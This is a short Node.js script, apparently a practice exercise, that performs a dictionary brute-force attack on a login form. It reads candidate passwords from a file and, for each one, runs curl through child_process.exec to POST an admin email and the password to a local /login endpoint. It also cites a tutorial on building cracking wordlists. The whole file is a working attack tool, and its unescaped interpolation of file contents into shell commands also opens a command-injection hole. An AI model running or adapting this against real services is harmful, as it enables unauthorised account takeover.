const { exec } = require('child_process');
const { readFile } = require('fs');

const passwords = ['azerty', '123', 'toto', '1234'];
// https://www.hackingarticles.in/5-ways-create-dictionary-bruteforcing/

function attack(passwords) {
    const email = 'admin@site.fr';
    const headers = '-H "user-agent:safari" -H "content-type:application/x-www-form-urlencoded"';
    const url = 'http://localhost:3100/login';
    let payload = '';
    let cmd = '';

    passwords.forEach(p => {
        payload = `-d "email=${email}&password=${p}"`;
        cmd = `curl ${headers} ${payload} ${url}`;
        exec(cmd, (err, stdout, stderr) => {
            console.log(stdout);
            // if (stdout == 'Login OK') {
            //     console.log('Password found => ' + p);
            // }
        });
    })
}

readFile('./passwords.txt', (err, data) => {
    const passwords = data.toString('utf-8').split('\n');
    attack(passwords);
})

//attack(passwords);
